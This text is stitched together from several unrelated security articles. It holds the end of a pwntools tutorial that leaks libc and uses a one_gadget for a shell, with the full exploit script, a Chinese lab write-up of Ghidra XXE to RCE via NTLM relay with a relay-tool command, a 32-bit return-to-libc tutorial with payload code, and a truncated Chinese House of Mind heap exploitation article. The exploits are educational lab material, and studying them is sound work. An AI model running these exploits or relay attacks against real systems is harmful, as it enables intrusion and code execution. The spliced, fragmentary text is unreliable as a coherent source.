Since we exploiting the program locally we can use\nldd to obtain the used libc.\n# Find the used libc (obviously our local libc since this is a local challenge)\nldd .\/chapter_4\nlinux-vdso.so.1 (0x00007fffe21a6000)\nlibc.so.6 => \/lib\/x86_64-linux-gnu\/libc.so.6 (0x00007f37310e9000)\n\/lib64\/ld-linux-x86-64.so.2 (0x00007f37314da000)\nNext, we load the libc in our python script for later use libc =\nELF(\"\/lib\/x86_64-linux-gnu\/libc.so.6\") and we use pwntools features to\ncall puts with the correct address. Since puts uses one argument we\nhave to set the rdi register ([11]Read more about calling conventions).\n# find a suitable gadget to set rdi\nROPgadget --binary chapter_4 | grep rdi\n0x00000000004006b3 : pop rdi ; ret      <--------------------------\n0x0000000000400594 : scasd eax, dword ptr [rdi] ; or ah, byte ptr [rax] ; add by\nte ptr [rcx], al ; pop rbp ; ret\nWe use the gadget to set the rdi register and call puts. This will\nprint the address of the GOT entry and we can convert the leaked binary\nstring to an integer with pwntools (u64(), 8 bytes unpack). Then we\njust have to subtract the offset of puts of our local libc to get the\nbase address of the mapped libc in memory.\nfrom pwn import *\ndef pad_null_bytes(value):\nreturn value + '\\x00' * (8-len(value))\nchapter_4_elf = ELF(\".\/chapter_4\")\nr = chapter_4_elf.process()\ncontext.binary = '.\/chapter_4'\n# libc\nlibc = ELF(\"\/lib\/x86_64-linux-gnu\/libc.so.6\")\n# attach gdb and continue\ngdb.attach(r.pid, \"\"\"c\"\"\")\npayload = \"\".join([\"A\"*40,\np64(0x00000000004006b3), # pop rdi ; ret\np64(chapter_4_elf.got[\"puts\"]), # value for rdi\np64(chapter_4_elf.symbols[\"puts\"]), # return address\n\"C\"*50])\nr.clean() # clean socket buffer (read all and print)\nr.sendline(payload) # send payload\nr.recvuntil(\"OK\\n\") # read until OK\\n\nputs_leak = u64(pad_null_bytes(r.readline())) # null byte padding + unpack to in\nteger(8 byte)\nlog.info(\"Puts @ %s\" % hex(puts_leak))\nlibc_base = puts_leak - libc.symbols[\"puts\"] # compute libc base\nlog.info(\"libc base @ %s\" % hex(libc_base))\nr.interactive() # we don't want to close the application\nOutput of our script:\n[+] Waiting for debugger: Done\n[*] Puts @ 0x7f97bd13f9c0\n[*] libc base @ 0x7f97bd0bf000      <----\n[*] Switching to interactive mode\n# Verify puts in gdb\np puts\n$1 = {int (const char *)} 0x7f97bd13f9c0 <_IO_puts>   <----\n# Verify libc base with vmmap\n0x00007f97bd0bf000 0x00007f97bd2a6000 0x0000000000000000 r-x \/lib\/x86_64-linux-g\nnu\/libc-2.27.so   <----\n0x00007f97bd2a6000 0x00007f97bd4a6000 0x00000000001e7000 --- \/lib\/x86_64-linux-g\nnu\/libc-2.27.so\n0x00007f97bd4a6000 0x00007f97bd4aa000 0x00000000001e7000 r-- \/lib\/x86_64-linux-g\nnu\/libc-2.27.so\n0x00007f97bd4aa000 0x00007f97bd4ac000 0x00000000001eb000 rw- \/lib\/x86_64-linux-g\nnu\/libc-2.27.so\nPerfect, the addresses are the same!\nIf we don\u2019t know the libc version we have to leak other addresses like\nfgets and strcmp and use [12]blukat.me to identify the correct version.\nWhen we found the correct one, we can download the libc from the\nwebsite. Since we do everything locally, we can just skip this part.\nBefore we look for a one-shot gadget, we need a way to interact with\nthe binary after receiving the leaked addresses because ASLR would\nrandomize the addresses on every startup again. Therefore, we just\nredirect the execution flow to the beginning and just exploit the\nbuffer overflow a second time.\npayload = \"\".join([\"A\"*40,\np64(0x00000000004006b3), # pop rdi ; ret\np64(chapter_4_elf.got[\"puts\"]), # value for rdi\np64(chapter_4_elf.symbols[\"puts\"]), # return address\np64(chapter_4_elf.symbols[\"main\"]), # return to main\n\"C\"*50])\n-->\nOutput:\n[*] Puts @ 0x7f0fa54599c0\n[*] libc base @ 0x7f0fa53d9000\n[*] Switching to interactive mode\nName?\n$\nJust copy the payload and send it again and we see the same crash as at\nthe beginning!\nNext, we have to identify a one-shot gadget. For that, we can use the\nprogram one_gadget with the identified libc.\none_gadget \/lib\/x86_64-linux-gnu\/libc.so.6\n0x4f2c5 execve(\"\/bin\/sh\", rsp+0x40, environ)\nconstraints:\nrcx == NULL\n0x4f322 execve(\"\/bin\/sh\", rsp+0x40, environ)\nconstraints:\n[rsp+0x40] == NULL\n0x10a38c        execve(\"\/bin\/sh\", rsp+0x70, environ)\nconstraints:\n[rsp+0x70] == NULL\nOk, we have some constraints\u2026\nIf we take a look at the stack in gdb after the program crashed, we can\nsee that the second gadget should work with its constraints, because we\ncontrol the C\u2019s (43).\nx\/gx $rsp+0x40\n0x7ffcc4538c98:    0x4343434343434343\n-> change \"C\"*50 to \"\\x00\"*100 and start the script again\nx\/gx $rsp+0x40\n0x7ffe6cdff488:    0x0000000000000000\nLet\u2019s try it..\npayload2 = \"\".join([\"A\"*40,\np64(libc_base + one_gadget), # pop a shell\n\"\\x00\"*100])\ngef\u27a4  c\nContinuing.\nprocess 9645 is executing new program: \/bin\/dash\nWe got it!\n[+] Waiting for debugger: Done\n[*] Puts @ 0x7f88bec589c0\n[*] libc base @ 0x7f88bebd8000\n[*] Switching to interactive mode\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"s\u00be\\x88\\x7f\nOK\n$ ls\nchapter_4  chapter_4.c    chapter_4_exploit.py\nFinal exploit:\nfrom pwn import *\ndef pad_null_bytes(value):\nreturn value + '\\x00' * (8-len(value))\nchapter_4_elf = ELF(\".\/chapter_4\")\nr = chapter_4_elf.process()\ncontext.binary = '.\/chapter_4'\n# libc\nlibc = ELF(\"\/lib\/x86_64-linux-gnu\/libc.so.6\")\n# attach gdb and continue\ngdb.attach(r.pid, \"\"\"c\"\"\")\n\"\"\"\none_gadget \/lib\/x86_64-linux-gnu\/libc.so.6\n0x4f2c5 execve(\"\/bin\/sh\", rsp+0x40, environ)\nconstraints:\nrcx == NULL\n0x4f322 execve(\"\/bin\/sh\", rsp+0x40, environ)\nconstraints:\n[rsp+0x40] == NULL\n0x10a38c        execve(\"\/bin\/sh\", rsp+0x70, environ)\nconstraints:\n[rsp+0x70] == NULL\n\"\"\"\none_gadget = 0x4f322\npayload = \"\".join([\"A\"*40,\np64(0x00000000004006b3), # pop rdi ; ret\np64(chapter_4_elf.got[\"puts\"]), # value for rdi\np64(chapter_4_elf.symbols[\"puts\"]), # return address\np64(chapter_4_elf.symbols[\"main\"]), # return to main\n\"C\"*50])\nr.clean()\nr.sendline(payload)\nr.recvuntil(\"OK\\n\")\nputs_leak = u64(pad_null_bytes(r.readline()[:-1])) # remove newline + null byte\npadding + unpack to integer (8 byte)\nlog.info(\"Puts @ %s\" % hex(puts_leak))\nlibc_base = puts_leak - libc.symbols[\"puts\"]\nlog.info(\"libc base @ %s\" % hex(libc_base))\npayload2 = \"\".join([\"A\"*40,\np64(libc_base + one_gadget), # pop a shell\n\"\\x00\"*100])\nr.clean()\nr.sendline(payload2)\nr.interactive() # we don't want to close the application\n__________________________________________________________________\nPlease be patient with yourself and learn slowly, so that you\nunderstand everything correctly.\nHappy Hacking!\nTags: [13]Binary Exploitation Series, [14]CTF\nUpdated: November 17, 2018\n[15]Previous [16]Next\nYou May Also Enjoy\n[17]Binary Exploitation Series (7): Full RelRO Bypass\n11 minute read\nHello everyone! Today we are going to bypass Full RelRO by using a\nrelative write out-of-bounds vulnerability. Like last time, we have\naccess to the binary (...\n[18]Facebook CTF 2019: overfloat\n5 minute read\noverfloat was an entry challenge of the pwnable category of the\nFacebook CTF 2019. A binary and a libc were provided (Original tar).\nYou can find the full ex...\n[19]Binary Exploitation Series (6): Defeating Stack Cookies\n11 minute read\nToday we are going to defeat stack cookies in two different ways. We\nhave access to the binary and we need to leak some information about\nits environment to ...\n[20]Binary Exploitation Series (5): How to leak data?\n4 minute read\nI often read the question \u201cHow to leak data?\u201d and I will try to give\nyou some basic ideas on how to get some information about a target\n(binary, memory layou...\n* [21]Feed\n\u00a9 2023 made0x78. Powered by [22]Jekyll & [23]Minimal Mistakes."}
{"text":"#[1]\u817e\u8baf\u5b89\u5168\u7384\u6b66\u5b9e\u9a8c\u5ba4 [2]\u817e\u8baf\u5b89\u5168\u7384\u6b66\u5b9e\u9a8c\u5ba4\n[3]\u817e\u8baf\u5b89\u5168\u7384\u6b66\u5b9e\u9a8c\u5ba4\n* [4]\u9996\u9875 [5]\u5b89\u5168\u516c\u544a [6]\u62ab\u9732\u539f\u5219 [7]\u5173\u4e8e [8]English\nGhidra \u4ece XXE \u5230 RCE\n2019-03-18\n\u4f5c\u8005\uff1a\u817e\u8baf\u5b89\u5168\u7384\u6b66\u5b9e\u9a8c\u5ba4 tomato, salt\n0x00 \u80cc\u666f\nGhidra\u662f NSA \u53d1\u5e03\u7684\u4e00\u6b3e\u53cd\u6c47\u7f16\u5de5\u5177,\u5b83\u7684\u53d1\u5e03\u5f15\u8d77\u4e86\u5b89\u5168\u7814\u7a76\u4eba\u5458\u7684\u6781\u5927\u5174\u8da3\u3002\n\u6709\u7814\u7a76\u4eba\u5458\u53d1\u73b0Ghidra\u5728\u52a0\u8f7d\u5de5\u7a0b\u65f6\u4f1a\u5b58\u5728XXE\uff0c\u57fa\u4e8e\u7b14\u8005\u4e4b\u524d\u5bf9XXE\u6f0f\u6d1e\u5229\u7528\u7814\u7a76\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528Java\u4e2d\u7684\u7279\u6027\u4ee5\u53caWindows\u64cd\u4f5c\n\u7cfb\u7edf\u4e2dNTLM\u8ba4\u8bc1\u534f\u8bae\u7684\u7f3a\u9677\u7684\u7ec4\u5408\u6765\u5b8c\u6210RCE\u3002\n0x01 \u6280\u672f\u7ec6\u8282\nJava\u5728\u4f7f\u7528\u5185\u7f6e\u7c7b sun.net.www.protocol.http.HttpURLConnection\n\u53d1\u9001HTTP\u8bf7\u6c42\u9047\u5230\u72b6\u6001\u7801\u4e3a401\u7684HTTP\u8fd4\u56de\u5934\u65f6\uff0c\u4f1a\u5224\u65ad\u8be5\u9875\u9762\u8981\u6c42\u4f7f\u7528\u54ea\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u82e5\u91c7\u7528\u7684NTLM\u8ba4\u8bc1\u5219\u4f1a\u81ea\u52a8\u4f7f\u7528\u5f53\u524d\u7528\u6237\u51ed\u636e\u8fdb\u884c\u8ba4\u8bc1\u3002\n\u5176\u6839\u672c\u539f\u56e0\u5728\u4e8eWindows\u4e0b\u7684Java\u9ed8\u8ba4\u542f\u7528\u4e86\u900f\u660eNTLM\u8ba4\u8bc1\uff0c\u5e76\u4e14\u5c06\u6240\u6709\u7531\u5916\u90e8\u4f20\u5165\u7684URL\u5730\u5740\u90fd\u8ba4\u4e3a\u662f\u53ef\u4fe1\u7684\u3002\u5982\u4e0b\u9762\u4ee3\u7801\u6bb5\u6240\u793a\nsun.net.www.protocol.http.AuthScheme#NTLM\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\nif (tryTransparentNTLMServer) {\ntryTransparentNTLMServer =\nNTLMAuthenticationProxy.supportsTransparentAuth;\n\/* If the platform supports transparent authentication\n* then check if we are in a secure environment\n* whether, or not, we should try transparent authentication.*\/\nif (tryTransparentNTLMServer) {\ntryTransparentNTLMServer =\nNTLMAuthenticationProxy.isTrustedSite(url);\n}\n}\n\u518d\u8ddf\u5165NTLMAuthenticationProxy.isTrustedSite\u65b9\u6cd5\n1\n2\n3\n4\n5\n6\n7\n8\n9\npublic static boolean isTrustedSite(URL url) {\ntry {\nreturn (Boolean)isTrustedSite.invoke(null, url);\n} catch (ReflectiveOperationException roe) {\nfinest(roe);\n}\nreturn false;\n}\n\u901a\u8fc7\u53cd\u5c04\u8c03\u7528\u4e86sun.net.www.protocol.http.ntlm.NTLMAuthentication\u4e2d\u7684isTrustedSite\n\u65b9\u6cd5\uff0c\u5728\u6b64\u65b9\u6cd5\u4e2d\u5c06\u6240\u6709\u5916\u90e8\u4f20\u5165\u7684URL\u90fd\u5224\u5b9a\u4e3a\u53ef\u4fe1\u7684\u3002\n\u653b\u51fb\u8005\u901a\u8fc7\u642d\u5efa\u57fa\u4e8eNTLM\u8ba4\u8bc1\u7684HTTP Server\u5373\u53ef\u83b7\u53d6\u5230\u5f53\u524d\u7528\u6237\u7684Net-NTLM Hash\u3002\n\u6211\u4eec\u518d\u6765\u770bNTLM\u8ba4\u8bc1\u534f\u8bae\u7684\u7f3a\u9677\u3002NTLM\u8ba4\u8bc1\u534f\u8bae\u4e2d\u5b58\u5728\u4e00\u79cd\u5f88\u53e4\u8001\u7684\u653b\u51fb\u7684\u6280\u672f\uff0c\u88ab\u79f0\u4f5c\u4e3aNTLM\nRelay\u653b\u51fb\u3002\u6b64\u653b\u51fb\u7684\u539f\u7406\u7f51\u4e0a\u5df2\u7ecf\u6709\u5f88\u591a\u6587\u7ae0\u8fdb\u884c\u8bf4\u660e\uff0c\u5728\u6b64\u4e0d\u518d\u8d58\u8ff0\u3002\n\u4f46\u5728\u6b64\u6b21\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u4e2d\u6211\u4eec\u4f7f\u7528\u7684\u51ed\u636e\u53cd\u5c04\u653b\u51fb\uff0c\u5373\u4e3a\u653b\u51fb\u8005\u5c06\u53d7\u5bb3\u8005\u7684Net-NTLM\nHash\u518d\u6b21Relay\u7ed9\u53d7\u5bb3\u8005\uff0c\u8fbe\u5230\u4ee5\u5f7c\u4e4b\u9053\u8fd8\u65bd\u5f7c\u8eab\u7684\u6548\u679c\u3002\n\u4e0b\u9762\u6765\u770b\u770b\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u653b\u51fb\u8005\u9996\u5148\u642d\u5efa\u57fa\u4e8eNTLM\u8ba4\u8bc1\u7684\u6076\u610fHTTP\nServer\uff0c\u7136\u540e\u901a\u8fc7XXE\/SSRF\u7b49\u6f0f\u6d1e\u4f7f\u53d7\u5bb3\u8005\u5411\u6076\u610f\u7684HTTP Server\u8fdb\u884cNTLM\u8ba4\u8bc1\u3002\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cNTLM\u8ba4\u8bc1\u5206\u4e3a\u4e24\u4e2a\u7248\u672cNTLMv1\u548cNTLMv2\uff0c\u5728\u8fdb\u884cNTLMv1\u7c7b\u578b\u8ba4\u8bc1\u65f6\u653b\u51fb\u5c06\u83b7\u53d6\u5230\u7684Net-NTLM\nHash\u76f4\u63a5Relay\u7ed9\u53d7\u5bb3\u8005\u7684SMB\u670d\u52a1\u5373\u53ef\uff0c\u4f46\u662f\u5728\u4f7f\u7528NTLMv2\u7c7b\u578b\u8ba4\u8bc1\u65f6\uff0c\u653b\u51fb\u8005\u5728Relay\u65f6\u9700\u8981\u5c06NTLM\u8ba4\u8bc1\u4e2dType 2\nMessage\u7684Negotiate Flags\u8fdb\u884c\u4fee\u6539\uff0c\u5c06Negotiate Always Sign\u4e0eNegotiate 0x00004000\n\u4e24\u4e2a\u6807\u5fd7\u4f4d\u4ece\u8bbe\u7f6e\u6539\u4e3a\u4e0d\u8bbe\u7f6e\uff0c\u8fd9\u5176\u4e2d\u5177\u4f53\u4ee3\u8868\u7684\u542b\u4e49\u4e3a\u8ba9\u6b64\u6b21\u8ba4\u8bc1\u88ab\u8ba4\u4f5c\u5728\u7f51\u7edc\u4e0a(Relay\u7ed9\u672c\u673a\u4f1a\u88ab\u5f53\u505a\u662f\u4e00\u6b21\u672c\u5730\u8ba4\u8bc1)\u8fdb\u884c\u4ee5\u53ca\u5c06\u8ba4\u8bc1\u4e2d\u7684\u7b7e\u540d\u8fdb\u884c\n\u53bb\u9664\u3002\n\u4e3a\u5b8c\u6210\u8be5\u653b\u51fb\u8fc7\u7a0b\uff0c\u7b14\u8005\u5df2\u7ecf\u7f16\u5199\u597d[9]\u811a\u672c\u3002\n0x03 \u590d\u73b0\u6b65\u9aa4\n\u53d7\u5bb3\u8005\u73af\u5883 Oracle JDK 8u161\u3001Win10\u3001Administrator\u8d26\u6237\n\u653b\u51fb\u8005\u73af\u5883 Ubuntu16.04 IP\u4e3a192.168.130.136\n\u9996\u5148\u5728\u5c40\u57df\u7f51\u5185\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u8fd0\u884c\u524d\u9762\u63d0\u5230\u7684\u811a\u672c\n1\npython ultrarelay.py -ip 192.168.130.136 -smb2support\n\u811a\u672c\u5c06\u4f1a\u572880\u7aef\u53e3\u5f00\u542fHTTP\u670d\u52a1\u3002\u7136\u540e\u56de\u5230Win10\u4e2d\u65b0\u5efa\u4e00\u4e2aGhidra\u5de5\u7a0b\uff0c\u4fee\u6539\u5de5\u7a0b\u4e2d\u7684project.prp\uff0c\u63d2\u5165XXE\u653b\u51fb\u4ee3\u7801\uff0c\u5982\u4e0b\n\u56fe\u6240\u793a\n\u518d\u6b21\u4f7f\u7528Ghidra\u6253\u5f00\u6b64\u6076\u610f\u5de5\u7a0b\uff0c\u653b\u51fb\u8005\u5c31\u80fd\u83b7\u53d6\u5230\u53d7\u5bb3\u8005\u673a\u5668\u7684NTLM Hash\uff0c\u4e5f\u53ef\u901a\u8fc7\u811a\u672c\u4e2d\u7684\u53c2\u6570\u5728\u53d7\u5bb3\u8005\u673a\u5668\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\n0x04 \u9632\u5fa1\u63aa\u65bd\n1.\u5f00\u542fWindows\u9632\u706b\u5899\uff0c\u7981\u6b62\u5916\u90e8\u8bf7\u6c42\u8bbf\u95eeSMB\u670d\u52a1\n2.\u82e5\u8981\u63d0\u4f9bSMB\u670d\u52a1 \u5219\u5efa\u8bae\u5f00\u542fSMB Sign\n3.\u5347\u7ea7JDK\u81f3\u6700\u65b0\u7248\u672c\n0x05 \u53c2\u8003\u8d44\u6599\n[10]https:\/\/twitter.com\/sghctoma\/status\/1103392091009413120\n[11]https:\/\/conference.hitb.org\/hitbsecconf2018dxb\/materials\/D2T2%20-%2\n0NTLM%20Relay%20Is%20Dead%20Long%20Live%20NTLM%20Relay%20-%20Jianing%20\nWang%20and%20Junyu%20Zhou.pdf\n[12]\u6df1\u5165\u5206\u6790Adobe\u5ffd\u7565\u4e866\u5e74\u7684PDF\u6f0f\u6d1e \u4e0a\u4e00\u7bc7 [13]\u5168\u7f51\u7b5b\u67e5 WinRAR \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e (CVE-2018-20250)\n\u4e0b\u4e00\u7bc7\n\u00a9 2015 - 2023 Tencent Security Xuanwu Lab. All Rights Reserved."}
{"text":"#[1]desc0n0cid0 - Atom [2]desc0n0cid0 - RSS [3]desc0n0cid0 - Atom\n[4][des.jpg]\n[5]desc0n0cid0\nPython, cybersecurity, programming.\nMenu\n[6]Skip to content\n* [7]Home\n* [8]Business\n+ [9]Internet\n+ [10]Market\n+ [11]Stock\n* [12]Downloads\n+ [13]Dvd\n+ [14]Games\n+ [15]Software\no [16]Office\n* [17]Parent Category\n+ [18]Child Category 1\no [19]Sub Child Category 1\no [20]Sub Child Category 2\no [21]Sub Child Category 3\n+ [22]Child Category 2\n+ [23]Child Category 3\n+ [24]Child Category 4\n* [25]Featured\n* [26]Health\n+ [27]Childcare\n+ [28]Doctors\n* [29]Uncategorized\n[30]Sidebar\nSearch for: ____________________ Submit\nMe\n* [31]LinkedIn\n* [32]twitter\n* [33]Github\n* [34]rozwal.to\nBlog Archive\n* [35]\u25ba  [36]2019 (1)\n+ [37]\u25ba  [38]January (1)\n* [39]\u25ba  [40]2017 (6)\n+ [41]\u25ba  [42]June (2)\n+ [43]\u25ba  [44]May (1)\n+ [45]\u25ba  [46]April (1)\n+ [47]\u25ba  [48]March (1)\n+ [49]\u25ba  [50]January (1)\n* [51]\u25bc  [52]2016 (7)\n+ [53]\u25ba  [54]November (2)\n+ [55]\u25ba  [56]October (1)\n+ [57]\u25bc  [58]September (4)\no [59]Part 3 | Stack-based Buffer Overflow exploitation ...\no [60]Part 2 | Stack-based Buffer Overflow exploitation ...\no [61]Part 1 | Stack-based Buffer Overflow exploitation ...\no [62]Magic behind python WAT moments\nThursday 29 September 2016\n[63]Part 3 | Stack-based Buffer Overflow exploitation to shell by example\nStandard\n* Share This:\n* [64] Facebook\n* [65] Twitter\n* [66] Google+\n* [67] Stumble\n* [68] Digg\nThis is continuation of my guide on binary exploitation, in this part\nwe are going to cover return-to-libc attack which was invented to\ndefeat DEP\/Non executable stack. As you can remember, we have used the\nfact that stack is executable in the [69]previous part of this guide.\n5. DEP\/NX\nToday all of the standard software is compiled without executable\nstack, this is a protection that was introduced as a response to the\nattack that I've showed you the last time. Do you recall '-z execstack'\noption? If we were to use the last exploit on binary which is not\ncompiled with that flag, we wouldn't get shell at all. Processor when\njumping on to the stack would know that this memory shouldn't be\nexecuted, this is rw(read and write) section only.\nCybersecurity is a big war, when there is a protection in place, after\nsome time someone finds a way around it, so in this post I'll show you\nwhat the bad guys figured out to exploit stack based buffer overflow\neven when DEP\/NX is turned on.\nFor example source code we will use exactly the same one as previously.\nOnly compilation parameters will change, we are goin to remove\nexecstack flag and add '-m32' switch, because I'll show you how to\nbypass NX on x86 (32 bit):\ngcc exploit102.c -o exploit102 -fno-stack-protector -m32\nWhy 32bit vs 64bit matter at all? Isn't it all the same thing when it\ncomes to exploitation?\nTurns out that not really, the reason behind that are different calling\nconventions in those architectures. I've already linked a [70]great\npaper by Agner Fog where you can find (16th) page called 'Function\ncalling conventions'. Looking at the table provided it's easy to spot\nthe differences. In C programming language  'stdcall' is the call that\nwe are interested in, it's a convention in which all the arguments are\npushed on to the stack.\nSo stack after calling a function with following signature\nvoid function(int a, int b, int c);\nwould look like this:\n| ebp | eip | c | b | a | ...\nWe are going to use this feature in our exploit.\n6. Return-to-libc\nKnowing that we cannot execute our code from the stack, we can use\nsomething called [71]return-to-libc attack, which is simplified version\nof Return Oriented Programming(ROP).\nIn short, we want to override eip with address of some function from\nlibc(standard C library) and pass arguments to it using stack.\nLet's say we want to return to system() function.\n( Quick look into gdb and we know what the address of system() is)\n[72][gdb_11.png]\nSo for this to happen, our stack must be overwritten to look like so:\n|   ebp   | eip | c | b | a | ...\n|  JUNK | 0xf7e28d80 | JUNK(new eip) | argv[1] | ...\nWhat will happen is that after function returns, it will return to\nsystem() function which needs one argument from the stack so it will\npop that from it. If we make it valid argument, call will be\nsuccessful.\nBecause we are not calling our new function with call instruction, we\nneed to supply next eip on the stack by ourselves to keep offsets to\nthe arguments right.\nOur goal will be to call:\nsystem(\"\/bin\/sh\"); or system(\"sh\");\nWe will use latter option (I leave first one as exercise for the reader\n(Tip: Put it on the stack or inside env variable in case of self\nexploitation)).\nFor that we will use very convenient feature that pwndbg has of finding\nsequence of bytes inside a binary.\n[73][gdb_12.png]\nWe got everything we need:\nsystem(): 0xf7e28d80\n'sh': 0xf7dfc5f7\nYou should already know how to find out which bytes of overflown buffer\nare landing inside eip. If you don't remember check out [74]part 1.\n7. Another exploit!\nimport struct\ndef dd(v):\nreturn struct.pack(\"I\", v)\nbuf = \"\"\nbuf += dd(0xf7e28d80)\nbuf += dd(0xdeadbeef)\nbuf += dd(0xf7dfc5f7)\nwith open(\"payload\", \"wb\") as f:\nf.write(\"A\" * 1036)\nf.write(buf)\nTake note of dq -> dd change, that is caused by the pointer size change\nfrom quad word to double word (8 bytes -> 4 bytes).\n[75][gdb_13.png]\nAnd we got shell again! :)\nExercise: try to return from shell cleanly, without segmentation fault\nerror. (Tip: what is the return address of system() call, how about\ncalling exit() after all ?).\nAnd there you have it, you have survived another part of this tutorial,\ngood job!\n* Author [76]desconocido\nDate [77]September 29, 2016\nComments [78]No comments\n[79]Email This[80]BlogThis![81]Share to Twitter[82]Share to Facebook\n[83]\u2190 Newer Post [84]Older Post \u2192 [85]Home\n0 comments:\nPost a Comment\nSubscribe to: [86]Post Comments (Atom)\nCopyright \u00a9 [87]desc0n0cid0 | Powered by [88]Blogger\nDesign by [89]Automattic\nBlogger Theme by [90]NewBloggerThemes.com"}
{"text":"\u91cd\u8981:\n> \u672c\u6587\u53c2\u8003[^sploitfun]\u548c[MallocMaleficarum](..\/media\/attach\/MallocMaleficarum.Txt),\u7f16\u8bd1\u65f6\u5019\u6ca1\u6709\u4f7f\u7528`ASLR`,`NX`,`RELRO`\u5b89\u5168\u673a\u5236\u3002\n\n\u81ea 2004 \u540e\uff0c`glibc malloc` GOT \u83b7\u5f97\u52a0\u56fa\uff0c`unlink`\u6280\u672f\u88ab\u6dd8\u6c70\u3002\u4f46\u662f\u5f88\u5feb\u5728 2005 \u5e74\uff0c`Phantasmal Phatasmagoria` \u5e26\u6765\u4e86\u4e00\u7cfb\u5217\u9488\u5bf9\u5806\u4e00\u5904\u5229\u7528\u7684\u6280\u672f\u3002\n\n>\n* The House of Prime\uff1a\u5728\u8c03\u7528\u51fd\u6570 malloc \u540e\uff0c\u8981\u6c42\u4e24\u4e2a\u91ca\u653e\u7684\u5806\u5757\u5305\u542b\u653b\u51fb\u8005\u53ef\u63a7\u7684 size \u5b57\u6bb5\u3002\n* The House of Mind\uff1a\u8981\u6c42\u80fd\u591f\u64cd\u4f5c\u7a0b\u5e8f\u53cd\u590d\u5206\u914d\u65b0\u7684\u5185\u5b58\u3002\n* The House of Force\uff1a\u8981\u6c42\u80fd\u591f\u91cd\u5199 top chunk\uff0c\u5e76\u4e14\u5b58\u5728\u4e00\u4e2a\u53ef\u63a7 size \u7684 malloc \u51fd\u6570\uff0c\u6700\u540e\u8fd8\u9700\u8981\u518d\u8c03\u7528\u53e6\u4e00\u4e2a malloc \u51fd\u6570\u3002\n* The House of Lore\uff1a\u4e0d\u9002\u7528\u4e8e\u6211\u4eec\u7684\u4f8b\u7a0b\u3002\n* The House of Spirit\uff1a\u5047\u8bbe\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u4e00\u4e2a\u91ca\u653e\u5757\u7684\u6307\u9488\uff0c\u4f46\u662f\u8fd9\u4e2a\u6280\u672f\u8fd8\u4e0d\u80fd\u4f7f\u7528\u3002\n\n# House of Mind\n\n\u5728\u8fd9\u4e2a\u6280\u672f\u91cc\u9762\u653b\u51fb\u8005\u620f\u4f7f\u7528\u81ea\u5df1\u6784\u9020\u7684`arena`\u53bb\u620f\u5f04`malloc glibc`\u3002\u5047\u7684`arena` \u4ee5 unsorted bin \u7684 fd \u662f free - 12 \u7684 got \u5165\u53e3\u5730\u5740\uff0c\u56e0\u6b64\u6f0f\u6d1e\u7a0b\u5e8f\u5728 free chunk \u65f6 `free()` \u7684 got \u5165\u53e3\u88ab shellcode \u5730\u5740\u8986\u76d6\u540e\uff0c\u8fd9\u65f6 free \u88ab\u8c03 pbzip2 \u7528 shellcode \u5c31\u4f1a\u88ab\u6267\u884c!\n\n> \u4e0d\u662f\u6240\u6709\u5806\u6ea2\u51fa\u90fd\u80fd\u7528\u8fd9\u4e2a\u6280\u672f\uff0c\u4e0b\u9762\u662f\u80fd\u5e94\u7528`house of mind`\u5148\u51b3\u6761\u4ef6:\n\n\u9700\u8981\u4e00\u4e9b\u5217 malloc \u7684\u8c03\u7528\u76f4\u5230\u4e00\u5757\u5185\u5b58\u7684\u5730\u5740\u5bf9\u9f50\u5230 HEAP_MAX_SIZE \u7684\u6574\u6570\u500d\uff0c\u8fd9\u6837\u624d\u80fd\u5f97\u5230\u4e00\u5757\u6709\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5b58\u3002\n\n\u5047\u5192\u7684`help_info` \u7ed3\u6784\u4f53\u5728\u8fd9\u5185\u5b58\u533a\u57df\u88ab\u53d1\u73b0\u3002\u4f2a\u9020\u7684`heap_info`\u7684`arena`\u6307\u9488 ar_ptr \u5c06\u4f1a\u6307\u5411\u4f2a\u9020\u7684`arena`.\n\n\u56e0\u6b64\u4f2a\u9020\u7684`arena`\u548c\u4f2a\u9020\u7684`heap_info`\u7684\u5185\u5b58\u533a\u57df\u90fd\u4f1a\u88ab\u653b\u51fb\u8005\u63a7\u5236\u3002\n\nchunk \u7684 size \u57df(\u548c\u5b83\u7684 arena \u6307\u9488 - prereq 1) \u88ab\u653b\u51fb\u8005\u63a7\u5236\u5e94\u8be5\u88ab free\u3002\n\nchunk \u76f8\u90bb\u7684 free chunk \u524d\u9762\u4e0d\u8be5\u662f top chunk.\n\n\u6f0f\u6d1e\u7a0b\u5e8f: \u8fd9\u4e2a\u7a0b\u5e8f\u6ee1\u8db3\u4e0a\u8ff0\u9700\u6c42\u3002\n\n```c\n\/* vuln.c\n House of Mind vulnerable program\n *\/\n#include <stdio.h>\n#include <stdlib.h>\n\nint main (void) {\n char *ptr = malloc(1024); \/* First allocated chunk *\/\n char *ptr2; \/* Second chunk\/Last but one chunk *\/\n char *ptr3; \/* Last chunk *\/\n int heap = (int)ptr & 0xFFF00000;\n _Bool found = 0;\n int i = 2;\n\n for (i = 2; i < 1024; i++) {\n   \/* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 *\/\n   \/* 0x08100000 is the place where fake heap_info structure is found. *\/\n   [1]if (!found && (((int)(ptr2 = malloc(1024)) & 0xFFF00000) == \\\n      (heap + 0x100000))) {\n     printf(\"good heap allignment found on malloc() %i (%p)\\n\", i, ptr2);\n     found = 1;\n     break;\n   }\n }\n [2]ptr3 = malloc(1024); \/* Last chunk. Prereq 3: Next chunk to ptr2 != av->top *\/\n \/* User Input. *\/\n [3]fread (ptr, 1024 * 1024, 1, stdin);\n\n [4]free(ptr2); \/* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. *\/\n [5]free(ptr3); \/* Shell code execution. *\/\n return(0); \/* Bye 